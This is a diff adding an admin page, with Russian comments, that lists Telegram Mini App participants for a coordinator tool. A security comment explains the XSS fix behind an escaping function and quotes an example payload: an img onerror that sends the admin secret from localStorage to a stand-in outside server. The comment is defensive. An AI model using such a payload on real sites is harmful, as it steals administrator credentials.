@@ -1,0 +1,296 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Пользователи приложения — ABC Universe</title>
+<link rel="stylesheet" href="css/styles.css" />
+<style>
+/* Coordinator tool, not the Mini App -- wider layout than the app's own
+   460px phone-width container (same approach as admin.html / admin-events.html). */
+.app{max-width:820px}
+#gate{max-width:340px;margin:80px auto;padding:0 16px}
+.search-box{margin-bottom:14px}
+.search-box input{
+  width:100%;border:1px solid var(--line);border-radius:10px;padding:10px 12px;
+  font-family:inherit;font-size:14px;background:#fff;
+}
+.stats-row{display:flex;gap:18px;margin-bottom:16px;flex-wrap:wrap}
+.stat-tile{flex:1;min-width:120px;border:1px solid var(--line);border-radius:10px;padding:10px 14px}
+.stat-tile .num{font-size:22px;font-weight:800;color:var(--navy)}
+.stat-tile .label{font-size:12px;color:var(--muted)}
+table.users{width:100%;border-collapse:collapse;font-size:13px}
+table.users th{
+  text-align:left;font-size:11px;color:var(--muted);text-transform:uppercase;
+  letter-spacing:.03em;padding:6px 10px;border-bottom:1px solid var(--line);
+}
+table.users td{padding:9px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+table.users tr:last-child td{border-bottom:0}
+.badge-stale{display:inline-block;font-size:10px;color:var(--danger);background:#fdebec;border-radius:6px;padding:2px 6px;margin-left:6px}
+.muted{color:var(--muted)}
+
+/* Кнопка выхода: раньше выйти из админки было нельзя вообще — пароль оставался
+   в браузере до ручной чистки. Держим её неприметной, но всегда на виду. */
+.logout-btn{margin-left:auto;background:none;border:1px solid rgba(0,0,0,.18);
+  border-radius:8px;padding:6px 12px;font:inherit;font-size:13px;color:inherit;
+  cursor:pointer;opacity:.7}
+.logout-btn:hover{opacity:1}
+.top{display:flex;align-items:center;gap:12px}
+</style>
+</head>
+<body>
+
+<div id="gate">
+<div class="card">
+<h2>Вход</h2>
+<div class="field" style="margin-bottom:14px">
+<label for="secret-input" style="display:block;font-size:13px;font-weight:700;margin-bottom:6px;color:var(--navy)">Секретный код</label>
+<input id="secret-input" type="password" placeholder="ADMIN_SECRET" style="width:100%;border:1px solid var(--line);border-radius:10px;padding:10px 12px;font-family:inherit;font-size:14px;background:#fff" />
+</div>
+<button class="btn" id="gate-submit">Войти</button>
+<div class="sub" style="margin-top:10px">Тот же код, что и для остальных инструментов координатора.</div>
+</div>
+</div>
+
+<div class="app" id="main" style="display:none">
+<header class="top">
+<div class="brand"><b>Пользователи приложения</b></div>
+<button class="logout-btn" id="logout-btn" type="button">Выйти</button>
+</header>
+<main class="content">
+<div class="card">
+<h2>Кто уже подключился</h2>
+<div class="sub" style="margin-bottom:12px">Все участники, у кого привязан Telegram и приложение открывалось хотя бы раз. Сортировка — по последней активности, самые "молчащие" внизу.</div>
+
+<div class="stats-row" id="stats-row"></div>
+
+<div class="search-box">
+<input id="search-users" placeholder="Поиск по имени…" />
+</div>
+<button class="btn secondary" id="refresh-btn" style="margin-bottom:14px">Обновить</button>
+<div id="table-wrap"><div class="sub" style="padding:12px">Загрузка…</div></div>
+</div>
+</main>
+</div>
+
+<script type="module">
+/**
+ * ЭКРАНИРОВАНИЕ ВЫВОДА (02.09.2026).
+ *
+ * Всё, что приходит с бэкенда, вставлялось в страницу через innerHTML как есть.
+ * Часть этих данных вводит не координатор и не amoCRM, а сам студент: имя
+ * участника берётся из его профиля в Telegram (ensureParticipantRow_ в Api.gs).
+ *
+ * Чем это грозило. Человек ставит себе в Telegram имя вида
+ *   <img src=x onerror="fetch('https://чужой-сервер/?s='+localStorage.wtusa_admin_secret)">
+ * и один раз открывает Mini App — ссылка на бота публична, белого списка нет.
+ * Как только координатор откроет эту страницу, код выполнится в его браузере и
+ * утащит пароль администратора. А с этим паролем можно рассылать произвольные
+ * сообщения на любые номера с рабочего WhatsApp-канала компании и привязывать
+ * свой Telegram к чужим сделкам.
+ *
+ * esc() превращает пять символов, значимых для HTML, в безопасные сущности.
+ * Применять на КАЖДОЙ подстановке чужих данных внутри innerHTML, включая
+ * значения атрибутов (кавычки закрываются тем же способом).
+ */
+function esc(value) {
+  return String(value === null || value === undefined ? "" : value)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
+import { BACKEND_URL } from "./js/services/config.js";
+import { STAGES } from "./js/config/roadmap.config.js";
+
+/**
+ * ГДЕ ЛЕЖИТ ПАРОЛЬ (02.09.2026).
+ *
+ * Был localStorage — хранилище без срока жизни: пароль оставался в браузере
+ * навсегда, кнопки «Выйти» не было ни на одной странице, и на общем офисном
+ * компьютере любой, кто открывал адрес, сразу оказывался внутри. Удалить
+ * сохранённый пароль можно было только через инструменты разработчика.
+ *
+ * Стало sessionStorage — то же самое, но привязанное ко вкладке: закрыли
+ * вкладку, и пароль исчез. В пределах рабочего сеанса ничего не меняется,
+ * перезаходить не нужно. Плюс появилась кнопка «Выйти».
+ *
+ * Это не отменяет главного правила: пароль всё ещё уходит в адресе запроса
+ * (см. Api.gs), поэтому попадает в журнал выполнений Apps Script. Полностью
+ * это чинится переносом секрета в тело POST-запроса — отдельная правка.
+ */
+const SECRET_KEY = "wtusa_admin_secret";
+const gateEl = document.getElementById("gate");
+const mainEl = document.getElementById("main");
+
+const STAGE_TITLE = new Map(STAGES.map((s) => [s.id, s.shortTitle || s.title]));
+const STALE_DAYS = 14; // no activity for this long -> flagged for the coordinator's attention
+
+let users = []; // adminListAllParticipants_ shape
+
+function secret() {
+  return sessionStorage.getItem(SECRET_KEY) || "";
+}
+
+async function adminGet(action, extraParams) {
+  const params = new URLSearchParams({ action, secret: secret(), ...(extraParams || {}) });
+  const resp = await fetch(`${BACKEND_URL}?${params.toString()}`, { method: "GET" });
+  const json = await resp.json();
+  if (json.error) throw new Error(json.error);
+  return json;
+}
+
+function daysSince(iso) {
+  if (!iso) return Infinity;
+  return (Date.now() - new Date(iso).getTime()) / (1000 * 60 * 60 * 24);
+}
+
+function formatDate(iso) {
+  if (!iso) return "—";
+  return new Date(iso).toLocaleDateString("ru-RU", { day: "numeric", month: "short", year: "numeric" });
+}
+
+function formatRelative(iso) {
+  if (!iso) return "никогда";
+  const days = daysSince(iso);
+  if (days < 1) return "сегодня";
+  if (days < 2) return "вчера";
+  if (days < 30) return `${Math.floor(days)} дн. назад`;
+  const months = Math.floor(days / 30);
+  return `${months} мес. назад`;
+}
+
+function renderStats(list) {
+  const total = list.length;
+  const activeWeek = list.filter((u) => daysSince(u.lastActivity) <= 7).length;
+  const stale = list.filter((u) => daysSince(u.lastActivity) > STALE_DAYS).length;
+  document.getElementById("stats-row").innerHTML = `
+    <div class="stat-tile"><div class="num">${total}</div><div class="label">Всего подключено</div></div>
+    <div class="stat-tile"><div class="num">${activeWeek}</div><div class="label">Активны за 7 дней</div></div>
+    <div class="stat-tile"><div class="num">${stale}</div><div class="label">Не заходили ${STALE_DAYS}+ дней</div></div>`;
+}
+
+function renderTable(filterText) {
+  const wrap = document.getElementById("table-wrap");
+  const q = (filterText || "").trim().toLowerCase();
+  const filtered = q ? users.filter((u) => u.name.toLowerCase().includes(q)) : users;
+
+  if (!filtered.length) {
+    wrap.innerHTML = `<div class="sub" style="padding:12px">Никого не найдено.</div>`;
+    return;
+  }
+
+  const rows = filtered
+    .map((u) => {
+      const stale = daysSince(u.lastActivity) > STALE_DAYS;
+      const stageLabel = STAGE_TITLE.get(u.stage) || u.stage || "—";
+      const programLine = [u.program, u.season].filter(Boolean).join(" · ") || "—";
+      return `
+        <tr>
+          <td><b>${esc(u.name)}</b><div class="muted">${esc(programLine)}</div></td>
+          <td>${esc(stageLabel)}</td>
+          <td>${formatDate(u.createdAt)}</td>
+          <td>${formatRelative(u.lastActivity)}${stale ? '<span class="badge-stale">давно не заходил</span>' : ""}</td>
+        </tr>`;
+    })
+    .join("");
+
+  wrap.innerHTML = `
+    <div style="overflow-x:auto">
+    <table class="users">
+      <thead><tr><th>Участник</th><th>Этап</th><th>Регистрация</th><th>Последняя активность</th></tr></thead>
+      <tbody>${rows}</tbody>
+    </table>
+    </div>`;
+}
+
+async function loadUsers() {
+  const wrap = document.getElementById("table-wrap");
+  wrap.innerHTML = `<div class="sub" style="padding:12px">Загрузка…</div>`;
+  try {
+    users = await adminGet("adminListAllParticipants");
+    renderStats(users);
+    renderTable(document.getElementById("search-users").value);
+  } catch (err) {
+    wrap.innerHTML = `<div class="sub" style="padding:12px;color:var(--danger)">Не удалось загрузить список: ${esc(err.message)}</div>`;
+  }
+}
+
+let entering = false; // guards against a double-click/double-Enter firing tryEnter() twice
+let mainLoaded = false; // guards against loadMain() ever running (and re-binding listeners) twice
+
+async function init() {
+  const gateSubmit = document.getElementById("gate-submit");
+  const secretInput = document.getElementById("secret-input");
+
+  async function tryEnter() {
+    if (entering) return;
+    const value = secretInput.value.trim();
+    if (!value) return;
+    entering = true;
+    gateSubmit.disabled = true;
+    try {
+      sessionStorage.setItem(SECRET_KEY, value);
+      await loadMain();
+    } finally {
+      entering = false;
+      gateSubmit.disabled = false;
+    }
+  }
+  gateSubmit.addEventListener("click", tryEnter);
+  secretInput.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") tryEnter();
+  });
+
+  if (secret()) {
+    await loadMain();
+  }
+}
+
+async function loadMain() {
+  if (mainLoaded) {
+    gateEl.style.display = "none";
+    mainEl.style.display = "block";
+    return;
+  }
+  try {
+    users = await adminGet("adminListAllParticipants");
+  } catch (err) {
+    sessionStorage.removeItem(SECRET_KEY);
+    alert("Не удалось войти: " + (err.message || "проверьте код"));
+    return;
+  }
+
+  mainLoaded = true;
+  gateEl.style.display = "none";
+  mainEl.style.display = "block";
+
+  renderStats(users);
+  renderTable("");
+
+  let searchDebounce = null;
+  document.getElementById("search-users").addEventListener("input", (e) => {
+    clearTimeout(searchDebounce);
+    const value = e.target.value;
+    searchDebounce = setTimeout(() => renderTable(value), 200);
+  });
+  document.getElementById("refresh-btn").addEventListener("click", loadUsers);
+}
+
+init();
+
+  // Выход: стираем пароль и возвращаем страницу к экрану входа. Перезагрузка —
+  // самый честный способ сбросить всё загруженное состояние (списки участников,
+  // сделок, результаты), чтобы после выхода на экране не осталось чужих данных.
+  const logoutBtn = document.getElementById("logout-btn");
+  if (logoutBtn) {
+    logoutBtn.addEventListener("click", () => {
+      sessionStorage.removeItem(SECRET_KEY);
+      location.reload();
+    });
+  }
+</script>
+</body>
+</html>
